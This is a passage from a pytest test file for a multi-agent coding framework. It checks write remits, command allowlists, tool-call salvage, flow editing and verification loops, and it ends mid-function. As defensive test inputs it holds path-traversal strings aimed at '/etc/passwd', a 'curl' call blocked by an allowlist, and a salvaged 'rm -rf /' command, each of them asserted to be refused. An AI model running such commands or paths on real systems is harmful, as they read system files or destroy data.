"""Tests for the multi-agent layer: remits, tools, config resolution, salvage."""

from pathlib import Path

import copy

import pytest

from trance.agents.roles import BUILTIN_ROLES, AgentRole
from trance.agents.runner import TRIMMED, fit_context
from trance.agents.tools import AgentTools
from trance.config import Config
from trance.flow import Attempt, Flow, GateResult, Step
from trance.worker.client import salvage_tool_calls


@pytest.fixture
def project(tmp_path):
    (tmp_path / "backend").mkdir()
    (tmp_path / "backend" / "main.py").write_text("def hello():\n    return 'hi'\n")
    return tmp_path


def _tools(project, role_name="backend"):
    return AgentTools(project, BUILTIN_ROLES[role_name])


# ------------------------------------------------------------------ remits

def test_role_remit_allows_and_denies(project):
    backend = BUILTIN_ROLES["backend"]
    assert backend.may_write("backend/main.py")
    assert not backend.may_write("frontend/src/app.tsx")


def test_write_outside_remit_is_refused_and_reported(project):
    result = _tools(project).write_file("frontend/src/app.tsx", "export const x = 1;")
    assert not result.ok
    assert result.remit_violation == "frontend/src/app.tsx"
    assert not (project / "frontend").exists()  # nothing was created
    assert "frontend" in result.text and "remit" in result.text


def test_write_inside_remit_succeeds(project):
    result = _tools(project).write_file("backend/api.py", "X = 1\n")
    assert result.ok and result.files_written == ["backend/api.py"]
    assert (project / "backend" / "api.py").read_text() == "X = 1\n"


def test_paths_cannot_escape_the_project(project):
    for path in ("../../etc/passwd", "/etc/passwd"):
        assert not _tools(project).write_file(path, "pwned").ok
        assert not _tools(project).read_file(path).ok


def test_command_allowlist(project):
    tools = _tools(project, "tester")
    refused = tools.run_command("curl http://example.com")
    assert not refused.ok and "allowlist" in refused.text
    assert tools.run_command("python3 -c 'print(1+1)'").ok


def test_large_reads_are_truncated(project):
    (project / "backend" / "big.py").write_text("# pad\n" * 20000)
    result = _tools(project).read_file("backend/big.py")
    assert result.ok and "truncated" in result.text
    assert result.tokens < 8000  # would have been ~30k untruncated


# ----------------------------------------------------------- context budget

def test_fit_context_drops_oldest_tool_results_first():
    messages = [
        {"role": "system", "content": "sys"},
        {"role": "user", "content": "task"},
        {"role": "tool", "content": "x" * 40000},
        {"role": "tool", "content": "y" * 40000},
    ]
    fitted, dropped = fit_context(messages, budget=12000)
    assert dropped == 1
    assert fitted[2]["content"] == TRIMMED  # oldest went first
    assert fitted[3]["content"].startswith("y")


def test_fit_context_never_drops_system_or_task():
    messages = [
        {"role": "system", "content": "s" * 100000},
        {"role": "user", "content": "the task"},
    ]
    fitted, dropped = fit_context(messages, budget=100)
    assert dropped == 0
    assert fitted[0]["content"].startswith("s") and fitted[1]["content"] == "the task"


def test_fit_context_is_a_noop_under_budget():
    messages = [{"role": "tool", "content": "small"}]
    fitted, dropped = fit_context(messages, budget=10_000)
    assert dropped == 0 and fitted[0]["content"] == "small"


# -------------------------------------------------------------- config

def test_per_agent_provider_resolution(tmp_path):
    cfg_file = tmp_path / "trance.toml"
    cfg_file.write_text("""
[providers.big]
base_url = "http://big/v1"
model = "big-model"
context_window = 64000

[providers.small]
base_url = "http://small/v1"
model = "small-model"
context_window = 8000

[worker]
provider = "big"

[orchestrator]
provider = "small"
""")
    config = Config.load(cfg_file)

    coder = AgentRole(name="backend", title="B", description="", system_prompt="")
    tester = AgentRole(name="tester", title="T", description="", system_prompt="", provider="small")
    override = AgentRole(name="x", title="X", description="", system_prompt="",
                         provider="small", model="custom-model")

    assert config.for_role(coder).base_url == "http://big/v1"
    assert config.for_role(coder).model == "big-model"
    assert config.for_role(tester).base_url == "http://small/v1"
    assert config.for_role(tester).context_window == 8000
    assert config.for_role(override).model == "custom-model"
    # The orchestrator is configured centrally, not per role.
    assert config.for_orchestrator().base_url == "http://small/v1"


def test_input_budget_leaves_room_to_generate():
    config = Config.load(Path("/nonexistent"))
    resolved = config.resolve(config.worker)
    assert resolved.input_budget < resolved.context_window - resolved.max_tokens + 1


def test_api_keys_are_redacted(tmp_path):
    cfg_file = tmp_path / "trance.toml"
    cfg_file.write_text('[providers.p]\napi_key = "sk-secret"\n')
    assert "sk-secret" not in str(Config.load(cfg_file).to_dict())


# --------------------------------------------------------------- salvage

@pytest.mark.parametrize("text,expected", [
    ('{"name": "write_file", "arguments": {"path": "a.py", "content": "x=1"}}', "write_file"),
    ('```json\n{"name":"read_file","arguments":{"path":"b.py"}}\n```', "read_file"),
    ('{"type":"function","function":{"name":"read_file","arguments":{"path":"c.py"}}}', "read_file"),
])
def test_salvage_recovers_printed_tool_calls(text, expected):
    calls = salvage_tool_calls(text, {"write_file", "read_file"})
    assert [c.name for c in calls] == [expected]


def test_salvage_handles_braces_inside_strings():
    text = '{"name":"write_file","arguments":{"path":"d.py","content":"def f(): return {\\"k\\": 1}"}}'
    (call,) = salvage_tool_calls(text, {"write_file"})
    assert call.arguments["content"] == 'def f(): return {"k": 1}'


def test_salvage_refuses_tools_the_role_does_not_have():
    assert salvage_tool_calls('{"name":"run_command","arguments":{"command":"rm -rf /"}}',
                              {"write_file"}) == []
    assert salvage_tool_calls("just prose about writing files", {"write_file"}) == []


# ------------------------------------------------------------------ flow

def _edit(step, **changes):
    """A copy of `step` with the same id and some fields changed."""
    edited = Step(role=step.role, task=step.task, check=step.checker,
                  on_fail=step.on_fail, max_loops=step.loop_limit, entry=step.entry)
    edited.id = step.id
    for key, value in changes.items():
        setattr(edited, key, value)
    return edited


def test_editing_a_failed_step_requeues_it():
    """A plan you cannot correct after it failed is not much use."""
    failed = Step(role="frontend", task="build it", status="failed",
                  check="tester", attempts=[Attempt(n=1, verdict="FAIL")])
    flow = Flow(steps=[failed])

    outcome = flow.apply_edits([_edit(failed, task="build it properly",
                                      check="factchecker")])
    assert outcome["requeued"] == [failed.id]        # the work changed
    assert flow.steps[0].status == "pending"
    assert flow.steps[0].checker == "factchecker"    # and the setting applied too
    assert flow.steps[0].attempts == []       # a re-queued step starts clean


def test_editing_a_finished_step_requeues_it_too():
    done = Step(role="backend", task="old task", status="done")
    flow = Flow(steps=[done])
    flow.apply_edits([_edit(done, task="new task")])
    assert flow.steps[0].status == "pending" and flow.steps[0].task == "new task"


def test_a_cosmetic_edit_does_not_requeue():
    done = Step(role="backend", task="t", status="done", max_loops=2)
    flow = Flow(steps=[done])
    outcome = flow.apply_edits([_edit(done, max_loops=5)])
    assert outcome["requeued"] == []
    assert flow.steps[0].status == "done" and flow.steps[0].loop_limit == 5


def test_a_step_in_flight_cannot_be_edited_or_removed():
    running = Step(role="backend", task="original", status="running")
    flow = Flow(steps=[running])

    flow.apply_edits([_edit(running, task="hijacked")])
    assert flow.steps[0].task == "original" and flow.steps[0].status == "running"

    flow.apply_edits([])                       # try to delete it mid-flight
    assert [s.id for s in flow.steps] == [running.id]


def test_editing_keeps_queued_steering_on_a_pending_step():
    todo = Step(role="backend", task="t")
    todo.steering.append("use SQLModel")
    flow = Flow(steps=[todo])
    flow.apply_edits([_edit(todo, task="t revised")])
    assert flow.steps[0].steering == ["use SQLModel"]
    assert flow.steps[0].task == "t revised"


def test_steps_can_be_added_reordered_and_deleted():
    a = Step(role="backend", task="a", status="done")
    b = Step(role="tester", task="b")
    flow = Flow(steps=[a, b])
    fresh = Step(role="frontend", task="c")

    flow.apply_edits([fresh, _edit(b), _edit(a)])
    assert [s.task for s in flow.steps] == ["c", "b", "a"]

    flow.apply_edits([_edit(b)])
    assert [s.task for s in flow.steps] == ["b"]


# ------------------------------------------------------------ agent library

def test_library_seeds_from_builtins(tmp_path):
    from trance.agents.store import RoleStore

    store = RoleStore(tmp_path / "agents.json")
    assert {"backend", "frontend", "tester", "reviewer"} <= {r.name for r in store.all()}


def test_edits_persist_and_builtins_are_topped_up(tmp_path):
    """An edited built-in keeps its edit; a missing one is restored."""
    from trance.agents.store import RoleStore

    path = tmp_path / "agents.json"
    store = RoleStore(path)
    edited = store.get("backend")
    edited.paths = ["services/**"]
    edited.toolsets = ["files", "graph", "commands"]
    store.upsert(edited)

    reopened = RoleStore(path)
    assert reopened.get("backend").paths == ["services/**"]
    assert "commands" in reopened.get("backend").toolsets
    assert reopened.get("tester") is not None  # untouched builtin still there


def test_custom_agent_types_round_trip(tmp_path):
    from trance.agents.roles import AgentRole
    from trance.agents.store import RoleStore

    path = tmp_path / "agents.json"
    store = RoleStore(path)
    store.upsert(AgentRole(name="dba", title="DBA", description="schema work",
                           system_prompt="You own migrations.", paths=["migrations/**"],
                           toolsets=["files"], preset="cheap"))
    restored = RoleStore(path).get("dba")
    assert restored.paths == ["migrations/**"] and restored.preset == "cheap"


def test_builtins_cannot_be_deleted(tmp_path):
    from trance.agents.roles import AgentRole
    from trance.agents.store import RoleStore

    store = RoleStore(tmp_path / "agents.json")
    assert store.delete("backend") is False
    store.upsert(AgentRole(name="dba", title="D", description="", system_prompt=""))
    assert store.delete("dba") is True


def test_resolve_team_rebinds_to_the_library(tmp_path):
    """A session must never keep running a stale copy of an edited agent."""
    from trance.agents.roles import AgentRole
    from trance.agents.store import RoleStore

    store = RoleStore(tmp_path / "agents.json")
    stale = AgentRole(name="backend", title="old", description="", system_prompt="",
                      paths=["old/**"])
    (team,) = store.resolve_team([stale])
    assert team.paths != ["old/**"]        # library wins
    assert team is store.get("backend")


def test_resolve_team_accepts_names_and_drops_unknowns(tmp_path):
    from trance.agents.store import RoleStore

    store = RoleStore(tmp_path / "agents.json")
    team = store.resolve_team(["backend", "ghost", "tester", "backend"])
    assert [r.name for r in team] == ["backend", "tester"]  # deduped, unknown dropped


def test_validation_rejects_unusable_definitions():
    from trance.agents.store import validate

    assert validate({"name": "", "toolsets": []})
    assert validate({"name": "two words", "toolsets": []})
    assert validate({"name": "x", "toolsets": ["magic"]})
    # files without a remit means every write is refused — catch it at save time
    assert validate({"name": "x", "toolsets": ["files"], "paths": []})
    assert validate({"name": "x", "toolsets": ["files"], "paths": ["src/**"]}) is None
    assert validate({"name": "x", "toolsets": ["graph"]}) is None


# ------------------------------------------------- permissions in the prompt

def test_permissions_brief_matches_what_is_enforced():
    """The prompt text is generated from the enforcement constants, so it can
    only be wrong if the enforcement is wrong."""
    from trance.agents.tools import ALLOWED_COMMANDS, permissions_brief

    brief = permissions_brief(BUILTIN_ROLES["tester"])
    role = BUILTIN_ROLES["tester"]

    for glob in role.paths:
        assert glob in brief                      # every enforced glob is stated
    for command in ("pytest", "npm"):
        assert command in brief and command in ALLOWED_COMMANDS
    assert "REFUSED" in brief


def test_brief_states_the_absence_of_permissions_too():
    from trance.agents.tools import permissions_brief

    backend = permissions_brief(BUILTIN_ROLES["backend"])
    assert "may NOT run commands" in backend       # no `commands` toolset
    assert "pytest" not in backend                 # so no allowlist is advertised

    reviewer = permissions_brief(BUILTIN_ROLES["reviewer"])
    assert "may NOT write any file" in reviewer    # files toolset, empty remit

    planner = permissions_brief(BUILTIN_ROLES["planner"])
    assert "NO file access" in planner


def test_brief_reflects_a_custom_agents_actual_permissions():
    from trance.agents.tools import permissions_brief

    role = AgentRole(name="dba", title="DBA", description="", system_prompt="",
                     paths=["migrations/**"], toolsets=["files", "commands"])
    brief = permissions_brief(role)
    assert "migrations/**" in brief
    assert "may run commands" in brief
    assert "code graph" not in brief               # no graph toolset


def test_the_brief_is_in_every_agent_prompt(monkeypatch, tmp_path):
    """Regression guard: the permissions block must reach the model."""
    from trance.agents import runner
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse

    captured = {}

    class FakeClient:
        def complete(self, messages, tools=None, **kwargs):
            captured["messages"] = messages
            return ChatResponse(text="done", finish_reason="stop")

    monkeypatch.setattr(runner, "client_for", lambda config: FakeClient())
    runner.run_agent(
        role=BUILTIN_ROLES["backend"], task="build it", project=tmp_path,
        config=ModelConfig(), bus=EventBus(), session_id="s", step_id="st",
    )
    user_message = captured["messages"][1]["content"]
    assert "## Your permissions (enforced by the system)" in user_message
    assert "backend/**" in user_message
    assert "may NOT run commands" in user_message


def test_reset_restores_a_builtin(tmp_path):
    from trance.agents.store import RoleStore

    store = RoleStore(tmp_path / "agents.json")
    edited = store.get("backend")
    edited.system_prompt = "you do nothing"
    edited.paths = []
    store.upsert(edited)

    restored = store.reset("backend")
    assert restored.system_prompt == BUILTIN_ROLES["backend"].system_prompt
    assert restored.paths == BUILTIN_ROLES["backend"].paths
    assert RoleStore(tmp_path / "agents.json").get("backend").paths  # persisted

    assert store.reset("not-a-builtin") is None


def test_reset_does_not_mutate_the_shipped_definition(tmp_path):
    """A deepcopy bug here would corrupt the builtin for every later store."""
    from trance.agents.store import RoleStore

    store = RoleStore(tmp_path / "agents.json")
    role = store.reset("backend")
    role.paths.append("everything/**")
    assert "everything/**" not in BUILTIN_ROLES["backend"].paths


def test_editing_an_agent_never_mutates_the_shipped_default(tmp_path):
    """Regression: the store handed out the BUILTIN_ROLES object itself, so an
    edit rewrote the module-level default and reset() restored the edit."""
    from trance.agents.store import RoleStore

    before = list(BUILTIN_ROLES["backend"].paths)
    store = RoleStore(tmp_path / "agents.json")
    role = store.get("backend")
    role.paths = ["nonsense/**"]
    role.toolsets = []
    store.upsert(role)

    assert BUILTIN_ROLES["backend"].paths == before
    assert RoleStore(tmp_path / "other.json").get("backend").paths == before


# ------------------------------------------------------- console detail

def test_write_captures_a_diff_without_spending_model_context(project):
    """The diff is for the UI. Putting it in `text` would make the model
    re-read a diff of what it just wrote, on every single edit."""
    tools = _tools(project)
    tools.write_file("backend/calc.py", "def add(a, b):\n    return a + b\n")
    result = tools.write_file("backend/calc.py", "def add(a, b):\n    return a - b\n")

    assert result.detail["kind"] == "write"
    assert result.detail["created"] is False
    assert result.detail["added"] == 1 and result.detail["removed"] == 1
    assert "-    return a + b" in result.detail["diff"]
    assert "+    return a - b" in result.detail["diff"]
    assert "diff" not in result.text and "+++" not in result.text


def test_new_file_is_marked_created_with_a_full_add_diff(project):
    result = _tools(project).write_file("backend/new.py", "X = 1\nY = 2\n")
    assert result.detail["created"] is True
    assert result.detail["added"] == 2 and result.detail["removed"] == 0


def test_huge_diffs_are_truncated_for_display(project):
    from trance.agents.tools import MAX_DIFF_LINES

    tools = _tools(project)
    tools.write_file("backend/big.py", "")
    result = tools.write_file("backend/big.py", "\n".join(f"line {i}" for i in range(2000)))
    assert result.detail["truncated"] is True
    assert len(result.detail["diff"].splitlines()) <= MAX_DIFF_LINES


def test_command_detail_carries_exit_code_and_output(project):
    tools = _tools(project, "tester")
    ok = tools.run_command("python3 -c 'print(42)'")
    assert ok.detail["kind"] == "command" and ok.detail["exit_code"] == 0
    assert ok.detail["output"] == "42"

    bad = tools.run_command("python3 -c 'import sys; sys.exit(3)'")
    assert bad.detail["exit_code"] == 3 and bad.ok is False


def test_refused_write_carries_no_diff(project):
    result = _tools(project).write_file("frontend/x.tsx", "nope")
    assert result.remit_violation and result.detail == {}


# ------------------------------------------------------- fact checker

def test_factchecker_cannot_write_or_run_anything(project):
    """The point of this role: a verifier that *can* write files will write
    files. This one structurally cannot."""
    tools = AgentTools(project, BUILTIN_ROLES["factchecker"])
    offered = {s["function"]["name"] for s in tools.specs()}
    assert offered == {"check_file", "check_files", "list_files"}
    assert "write_file" not in offered and "run_command" not in offered
    assert "read_file" not in offered          # no contents, so no cheap way to review

    # Refused even if the model invents the tool name.
    assert not tools.call("write_file", {"path": "a.py", "content": "x"}).ok
    assert not tools.call("run_command", {"command": "pytest"}).ok
    assert not tools.call("read_file", {"path": "backend/main.py"}).ok
    assert not (project / "a.py").exists()


def test_check_file_reports_presence_and_emptiness(project):
    tools = AgentTools(project, BUILTIN_ROLES["factchecker"])
    (project / "backend" / "empty.py").write_text("")
    (project / "backend" / "blank.py").write_text("\n   \n")

    assert "has content" in tools.check_file("backend/main.py").text
    assert "EMPTY" in tools.check_file("backend/empty.py").text
    assert "EMPTY" in tools.check_file("backend/blank.py").text   # whitespace only
    assert "MISSING" in tools.check_file("backend/nope.py").text


def test_check_file_never_returns_contents(project):
    (project / "backend" / "secret.py").write_text("API_KEY = 'sk-do-not-leak'\n")
    result = AgentTools(project, BUILTIN_ROLES["factchecker"]).check_file("backend/secret.py")
    assert "sk-do-not-leak" not in result.text
    assert result.detail["files"][0]["size_bytes"] == len("API_KEY = 'sk-do-not-leak'\n")


def test_check_files_batches(project):
    tools = AgentTools(project, BUILTIN_ROLES["factchecker"])
    result = tools.check_files(["backend/main.py", "backend/gone.py"])
    assert "has content" in result.text and "MISSING" in result.text
    assert [f["path"] for f in result.detail["files"]] == ["backend/main.py", "backend/gone.py"]


def test_check_file_cannot_escape_the_project(project):
    result = AgentTools(project, BUILTIN_ROLES["factchecker"]).check_file("../../etc/passwd")
    assert "outside the project" in result.text


def test_an_inspect_only_agent_is_valid_without_a_remit():
    from trance.agents.store import validate

    assert validate({"name": "fc", "toolsets": ["inspect"], "paths": []}) is None


# ---------------------------------------------------------- verifiers

def test_only_inspection_capable_agents_are_verifiers():
    verifiers = {n for n, r in BUILTIN_ROLES.items() if r.verifier}
    assert verifiers == {"tester", "reviewer", "factchecker"}
    # The orchestrator has no toolsets at all — it could only ever guess.
    assert BUILTIN_ROLES["orchestrator"].verifier is False
    assert BUILTIN_ROLES["backend"].verifier is False


def test_a_non_verifier_is_not_asked_to_verify(tmp_path, monkeypatch):
    """Regression: any role could be named as a verifier, including the
    tool-less orchestrator, which would emit a verdict it never checked."""
    from trance.config import Config
    from trance.engine import FlowEngine
    from trance.events import EventBus
    from trance.flow import Attempt, Step
    from trance.session import Session

    session = Session(name="s", project_dir=str(tmp_path))
    session.team = [BUILTIN_ROLES["backend"], BUILTIN_ROLES["orchestrator"]]
    step = Step(role="backend", task="t", verify_with="orchestrator")

    bus = EventBus()
    seen = []
    bus.subscribe_sync(seen.append)
    engine = FlowEngine(session, Config.load(tmp_path / "none.toml"), bus)

    called = []
    monkeypatch.setattr("trance.engine.run_agent", lambda **kw: called.append(kw))

    verdict = engine._verify(step, Attempt(n=1))
    assert verdict == "UNKNOWN"          # unverified, so the step is blocked
    assert not called                    # the agent was never run
    assert any("not marked as a verifier" in (e.payload.get("message") or "")
               for e in seen if e.type == "warning")


def test_a_real_verifier_is_still_invoked(tmp_path, monkeypatch):
    from trance.config import Config
    from trance.engine import FlowEngine
    from trance.events import EventBus
    from trance.flow import Attempt, Step
    from trance.session import Session

    session = Session(name="s", project_dir=str(tmp_path))
    session.team = [BUILTIN_ROLES["frontend"], BUILTIN_ROLES["factchecker"]]
    step = Step(role="frontend", task="t", verify_with="factchecker")
    engine = FlowEngine(session, Config.load(tmp_path / "none.toml"), EventBus())

    class Turn:
        verdict = "PASS"
        text = "VERDICT: PASS"
        model_event_ids = ["ev"]

    monkeypatch.setattr("trance.engine.run_agent", lambda **kw: Turn())
    assert engine._verify(step, Attempt(n=1)) == "PASS"


# ------------------------------------------- malformed tool arguments

def test_unparsable_arguments_are_not_reported_as_empty():
    """Regression: a tool call truncated at max_tokens arrived as `{}`, so the
    agent was told it forgot 'path' and 'content' rather than that its output
    was cut off."""
    from trance.worker.client import _parse

    response = _parse({"choices": [{"finish_reason": "length", "message": {"tool_calls": [
        {"id": "1", "function": {"name": "write_file",
                                 "arguments": '{"path": "a.html", "content": "<html'}}]}}]})
    call = response.tool_calls[0]
    assert call.malformed is True
    assert call.arguments == {}
    assert call.raw_arguments.startswith('{"path"')   # kept for diagnosis
    assert response.finish_reason == "length"


def test_wellformed_arguments_are_not_flagged():
    from trance.worker.client import _parse

    response = _parse({"choices": [{"message": {"tool_calls": [
        {"id": "1", "function": {"name": "write_file",
                                 "arguments": '{"path": "a.py", "content": "x"}'}}]}}]})
    assert response.tool_calls[0].malformed is False
    assert response.tool_calls[0].arguments == {"path": "a.py", "content": "x"}


def test_truncated_call_tells_the_agent_what_actually_happened():
    from trance.agents.runner import _malformed_call_outcome
    from trance.providers.base import ToolCall

    call = ToolCall(id="1", name="write_file", arguments={}, malformed=True)
    truncated = _malformed_call_outcome(call, truncated=True, max_tokens=4096).text
    assert "cut off" in truncated and "4096" in truncated
    assert "Do not retry the same call" in truncated
    assert "smaller pieces" in truncated

    invalid = _malformed_call_outcome(call, truncated=False, max_tokens=4096).text
    assert "not valid JSON" in invalid


def test_bad_arguments_get_a_schema_error_not_a_python_traceback(project):
    result = _tools(project, "frontend").call("write_file", {})
    assert "missing required argument(s): path, content" in result.text
    assert "Expected arguments:" in result.text
    assert "positional" not in result.text     # no leaked Python signature

    wrong = _tools(project, "frontend").call("write_file", {"file": "a.js", "body": "x"})
    assert "unexpected argument(s): file, body" in wrong.text


def test_a_step_without_a_verifier_says_so(tmp_path):
    """Silence read as 'verified and passed'."""
    from trance.config import Config
    from trance.engine import FlowEngine
    from trance.events import EventBus
    from trance.flow import Attempt, Step
    from trance.session import Session

    bus = EventBus()
    seen = []
    bus.subscribe_sync(seen.append)
    engine = FlowEngine(Session(name="s", project_dir=str(tmp_path)),
                        Config.load(tmp_path / "none.toml"), bus)

    assert engine._verify(Step(role="backend", task="t"), Attempt(n=1)) is None
    assert any(e.type == "verification_skipped" for e in seen)


# ------------------------------------------------ per-agent commands

def test_write_file_creates_parent_directories(project):
    """The tester reached for mkdir because nothing told it this happens."""
    result = _tools(project).write_file("backend/deep/nested/new.py", "X = 1\n")
    assert result.ok
    assert (project / "backend" / "deep" / "nested" / "new.py").read_text() == "X = 1\n"


def test_agents_are_told_they_do_not_need_mkdir(project):
    from trance.agents.tools import permissions_brief

    brief = permissions_brief(BUILTIN_ROLES["tester"])
    assert "never need to create a folder before writing" in brief
    spec = next(s for s in _tools(project, "tester").specs()
                if s["function"]["name"] == "write_file")
    assert "created automatically" in spec["function"]["description"]


def test_a_role_can_narrow_its_own_allowlist(project):
    role = AgentRole(name="narrow", title="N", description="", system_prompt="",
                     toolsets=["files", "commands"], paths=["tests/**"], commands=["pytest"])
    tools = AgentTools(project, role)
    assert tools.allowed_commands == {"pytest"}
    refused = tools.run_command("python3 -c 'print(1)'")
    assert not refused.ok and "allowlist" in refused.text


def test_a_role_can_extend_its_allowlist(project):
    role = AgentRole(name="wide", title="W", description="", system_prompt="",
                     toolsets=["commands"], commands=["python3", "git"])
    assert AgentTools(project, role).run_command("python3 -c 'print(7)'").ok


def test_commands_can_be_pinned_to_a_subdirectory(project):
    (project / "tests").mkdir()
    role = AgentRole(name="pinned", title="P", description="", system_prompt="",
                     toolsets=["commands"], commands=["pwd"], workdir="tests")
    result = AgentTools(project, role).run_command("pwd")
    assert result.ok and result.detail["output"].endswith("/tests")


def test_a_workdir_cannot_escape_the_project(project):
    role = AgentRole(name="escape", title="E", description="", system_prompt="",
                     toolsets=["commands"], commands=["pwd"], workdir="../../")
    tools = AgentTools(project, role)
    assert tools.command_cwd == project          # falls back, never escapes


def test_the_refusal_message_lists_what_is_allowed(project):
    role = AgentRole(name="r", title="R", description="", system_prompt="",
                     toolsets=["commands"], commands=["pytest"])
    refused = AgentTools(project, role).run_command("mkdir newdir")
    assert "'mkdir'" in refused.text and "Allowed: pytest" in refused.text


# ------------------------------------------- block loop: check + fixer

def _engine(tmp_path, team, bus=None):
    from trance.config import Config
    from trance.engine import FlowEngine
    from trance.events import EventBus
    from trance.session import Session

    session = Session(name="s", project_dir=str(tmp_path))
    session.team = [BUILTIN_ROLES[n] for n in team]
    return FlowEngine(session, Config.load(tmp_path / "none.toml"), bus or EventBus())


class _Turn:
    """Stands in for agents.runner.AgentTurn."""

    def __init__(self, verdict, text="", outcome=("SUCCESS", ""), transcript=None):
        self.verdict = verdict
        self.transcript = transcript or []
        self.outcome = outcome
        self.reported_outcome = True
        self.text = text or f"VERDICT: {verdict}"
        self.model_event_ids = ["ev"]
        self.files_written = []
        self.remit_violations = []
        self.usage = {"input_tokens": 0, "output_tokens": 0}
        self.tool_calls = 0
        self.rounds = 1
        self.stop_reason = "stop"
        self.salvaged_calls = 0
        self.truncated_calls = 0
        self.context = {"tokens": 12000, "window": 64000, "budget": 55000,
                        "reserved": 8000, "percent": 18.8, "estimated": False}


def test_a_passing_check_lets_the_flow_move_on(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "factchecker"])
    step = Step(role="backend", task="t", check="factchecker")
    order = []
    monkeypatch.setattr("trance.engine.run_agent",
                        lambda **kw: (order.append(kw["role"].name),
                                      _Turn("PASS" if kw["role"].name == "factchecker" else None))[1])
    engine._execute(step)
    assert order == ["backend", "factchecker"]
    assert step.status == "done"
    assert not engine.session.stopping          # the flow continues


def test_a_failed_outcome_sends_the_work_to_the_fixer_then_loops(tmp_path, monkeypatch):
    """The step's own outcome opens the loop — a tester that finds a real bug
    did good work and the step still failed."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "factchecker", "reviewer"])
    step = Step(role="backend", task="build it", check="factchecker",
                on_fail="reviewer", max_loops=3)
    order, prompts = [], {}

    def fake(**kw):
        name = kw["role"].name
        order.append(name)
        prompts[name] = kw["task"]
        if name == "factchecker":
            return _Turn("PASS")                      # the report is honest
        if name == "backend":
            failing = order.count("backend") == 1
            return _Turn(None, "attempted",
                         outcome=("FAILED", "divide() raises on zero") if failing
                         else ("SUCCESS", ""))
        return _Turn(None, "fixed")

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    # No check after the first attempt: the agent said it failed, and there is
    # no claim of success to test.
    assert order == ["backend", "reviewer", "backend", "factchecker"]
    assert step.status == "done"
    assert "divide() raises on zero" in prompts["reviewer"]


def test_a_failed_check_sends_the_agent_back_to_finish_the_job(tmp_path, monkeypatch):
    """Claimed success + the check disagreeing means the report cannot be
    trusted; looping would just repeat it."""
    from trance.events import EventBus
    from trance.flow import Step

    bus = EventBus()
    seen = []
    bus.subscribe_sync(seen.append)
    engine = _engine(tmp_path, ["backend", "factchecker", "reviewer"], bus)
    step = Step(role="backend", task="t", check="factchecker",
                on_fail="reviewer", max_loops=3)
    order = []

    def fake(**kw):
        order.append(kw["role"].name)
        if kw["role"].name == "factchecker":
            return _Turn("FAIL", "index.html is MISSING")
        return _Turn(None, "all done", outcome=("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    # A failed check is usually something forgotten, so the agent that reported
    # success gets told what was missing and tries again — the fixer is for the
    # step's own FAILED outcome, not for this.
    assert order == ["backend", "factchecker"] * 3
    assert "reviewer" not in order
    assert step.status == "failed"                  # and it still halts in the end
    assert engine.session.status == "error"
    assert step.status == "failed"
    assert engine.session.stopping
    halted = [e for e in seen if e.type == "run_halted"]
    assert halted and halted[0].payload["lied"] is True
    assert "not actually done" in halted[0].payload["message"]


def test_an_admitted_failure_loops_even_if_the_check_also_fails(tmp_path, monkeypatch):
    """It did not claim success, so there is no lie — just work to redo."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "factchecker"])
    step = Step(role="backend", task="t", check="factchecker", max_loops=2)
    order = []

    def fake(**kw):
        order.append(kw["role"].name)
        if kw["role"].name == "factchecker":
            return _Turn("FAIL", "nothing on disk")
        first = order.count("backend") == 1
        return _Turn(None, "tried",
                     outcome=("FAILED", "could not write") if first else ("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)
    assert order == ["backend", "backend", "factchecker"]
    assert step.status == "failed"      # second pass claimed success, check says no
    assert engine.session.stopping


def test_without_a_fixer_the_block_simply_runs_again(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend"])
    step = Step(role="backend", task="t", max_loops=2)
    order = []

    def fake(**kw):
        order.append(kw["role"].name)
        first = order.count("backend") == 1
        return _Turn(None, "x",
                     outcome=("FAILED", "not yet") if first else ("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)
    assert order == ["backend", "backend"]
    assert step.status == "done"


def test_exhausting_the_loop_limit_halts_the_whole_flow(tmp_path, monkeypatch):
    """The loop can only be left by the step reporting success."""
    from trance.events import EventBus
    from trance.flow import Step

    bus = EventBus()
    seen = []
    bus.subscribe_sync(seen.append)
    engine = _engine(tmp_path, ["backend", "reviewer"], bus)
    step = Step(role="backend", task="t", on_fail="reviewer", max_loops=2)

    monkeypatch.setattr("trance.engine.run_agent",
                        lambda **kw: _Turn(None, "tried",
                                           outcome=("FAILED", "still broken")))
    engine._execute(step)

    assert step.status == "failed"
    assert len(step.attempts) == 2
    assert engine.session.stopping and engine.session.status == "error"
    halted = [e for e in seen if e.type == "run_halted"]
    assert halted and halted[0].payload["lied"] is False


def test_no_fixer_runs_on_the_final_loop(tmp_path, monkeypatch):
    """Fixing after the last check would be work nothing ever verifies."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "factchecker", "reviewer"])
    step = Step(role="backend", task="t", check="factchecker",
                on_fail="reviewer", max_loops=1)
    order = []
    monkeypatch.setattr("trance.engine.run_agent",
                        lambda **kw: (order.append(kw["role"].name),
                                      _Turn("FAIL", "no") if kw["role"].name == "factchecker"
                                      else _Turn(None, "x"))[1])
    engine._execute(step)
    assert order == ["backend", "factchecker"]           # reviewer never ran
    assert step.status == "failed"


def test_a_block_without_a_check_just_runs_once(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend"])
    step = Step(role="backend", task="t")
    order = []
    monkeypatch.setattr("trance.engine.run_agent",
                        lambda **kw: (order.append(kw["role"].name), _Turn(None, "done"))[1])
    engine._execute(step)
    assert order == ["backend"] and step.status == "done"


def test_legacy_verify_with_is_read_as_the_check(tmp_path, monkeypatch):
    from trance.flow import Step

    step = Step.from_dict({"role": "backend", "task": "t", "verify_with": "tester"})
    assert step.checker == "tester" and step.fixer == "backend"

    engine = _engine(tmp_path, ["backend", "tester"])
    monkeypatch.setattr("trance.engine.run_agent",
                        lambda **kw: _Turn("PASS") if kw["role"].name == "tester"
                        else _Turn(None, "d"))
    engine._execute(step)
    assert step.status == "done"


# ------------------------------------------- orchestrator proposals

def _roles():
